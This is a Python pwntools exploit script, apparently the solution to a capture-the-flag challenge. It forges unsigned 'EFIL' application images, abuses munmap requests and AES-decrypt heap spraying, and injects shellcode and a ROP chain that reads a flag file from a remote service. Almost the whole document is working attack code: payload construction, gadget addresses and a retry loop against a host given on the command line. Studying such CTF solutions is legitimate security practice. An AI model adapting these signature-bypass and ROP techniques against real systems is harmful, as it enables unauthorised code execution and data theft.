#!/usr/local/bin/python
from pwn import *
import hashlib, time

class Page(object):
    def __init__(self, base, prot, raw='', key=0xff, cert=None):
        assert len(raw) <= 0x1000
        self.base = base
        self.raw = raw
        self.prot = prot
        self.key = key
        if cert is None:
            self.cert = key
        else:
            # unsigned
            self.cert = 0xff

    def __str__(self):
        if self.key == 0xff:
            data = self.raw
            prot = self.prot
        else:
            iv = 'I' * 16
            K = 'K' * 32
            # we don't really need encryption
            crypt_info = K + iv
            assert len(crypt_info) == 0x30
            while len(self.raw) % 0x10:
                self.raw += 'P'
            raw = self.raw
            prot = self.prot | 8
            assert len(raw) == len(self.raw)
            if self.cert < 2:
                prot = prot | 0x10
                sig = 'X' * 0x100
                assert len(sig) == 0x100
            else:
                sig = ''
            data = sig + crypt_info + raw
        return struct.pack('<IIBBBB', self.base, len(self.raw), prot, 1,
                self.key, self.cert) + data

class App(object):
    def __init__(self, name='app'):
        self.name = name.ljust(0x20, '\x00')[:0x20]
        self.pages = []

    def add_segment(self, base, prot, raw, key=0xff, cert=None):
        for i in xrange(0, len(raw), 0x1000):
            self.pages.append(Page(base + i, prot, raw[i:i + 0x1000], key, cert))

    def __str__(self):
        return ''.join([
            'EFIL',
            struct.pack('<I', len(self.pages)),
            self.name
            ] + map(str, self.pages))



context.arch = 'amd64'

# read flag rop
loader_base = 0x10000000
Xopen = loader_base + 0x430
Xecho = loader_base + 0x2b0
_read = loader_base + 0xa0
_exit = loader_base + 0x50
_mprotect = loader_base + 0xd0
ret = loader_base + 0x57
pop_rdi = loader_base + 0x1d0
pop_rsi_r15 = loader_base + 0x1ce

# assume we already have code execution (or rop) as platform_app

regions = 0x20000020
a = App('1')
# munmap local request
a.add_segment(0x20004000, 3, '\x00' * 0x10 + ''.join(map(p64, [
    0x30001000, 0x30002000, 0x1000,
    ])))
for i in xrange((0x20004010 - regions) / 0x18 - len(a.pages)):
    a.add_segment(0x500000 + i * 0x1000, 3, '\x00' * 0x10)
app_1 = str(a)

a = App('2')
# munmap crypto response
crypto_result = 0x42000000 + 0x52000
a.add_segment(0x20004000, 3, '\x00' * 0x10 + ''.join(map(p64, [
    crypto_result, crypto_result + 0x1000, 0x1000,
    ])))
for i in xrange((0x20004010 - regions) / 0x18 - len(a.pages)):
    a.add_segment(0x500000 + i * 0x1000, 3, '\x00' * 0x10)
app_2 = str(a)

a = App('3')
shellcode = asm('''
        add rsp, 0xd0;
        ret;
        pop rdi;
        pop rsi;
        pop rdx;
        pop rcx;
        ret;
''').ljust(0x10, '\xcc')
assert len(shellcode) == 0x10

sapp_base = 0x80000
ret = sapp_base + 7
pop_rdi_rsi_rdx_rcx = ret + 1
flag_rop = 'flag333.txt'.ljust(0x10, '\x00') + ''.join(map(p64, [
    ret, ret, ret, ret, ret, ret, ret,
    pop_rdi_rsi_rdx_rcx, 0xf0000000, 0, 0, 0,
    Xopen,
    pop_rdi_rsi_rdx_rcx, 5, 0xf0000800, 0x100, 0,
    _read,
    pop_rdi_rsi_rdx_rcx, 0xf0000800, 0, 0, 0,
    Xecho,
    _exit
]))

a.add_segment(0x30001000, 3, '\x00' * 0x1000)
a.add_segment(crypto_result, 3, shellcode * 0x100)
# spray by aes_decrypt
a.add_segment(0xd0000000, 3, '\x00' * 0xf10, key=1, cert=0xff)
a.add_segment(sapp_base, 5, '\x00' * 0x720, key=0)
a.add_segment(0xf0000000, 3, flag_rop)
app_3 = str(a)

def exploit():
    r = remote(sys.argv[1], int(sys.argv[2]))

    def download(app, blob):
        r.sendline('download %s %d' % (app, len(blob)))
        r.send(blob)

    download('1', app_1)
    r.sendline('run 1')
    download('2', app_2)
    download('3', app_3)
    download('exp3.papp', open('exp3.papp').read())
    r.sendline('run exp3.papp')
    d = r.recvuntil('3 exit 0x1', timeout=0.5)
    r.close()
    print d
    flags = re.findall(r'OOO{.*}', d) # it appears multiple times
    print flags
    if len(flags) > 0:
        return flags[0]

if __name__ == '__main__':
    for _ in xrange(10):
        try:
            flag = exploit()
            if flag:
                break
        except KeyboardInterrupt:
            break
        except Exception as e:
            print e
            continue
    print 'FLAG:', flag
    sys.exit(0)
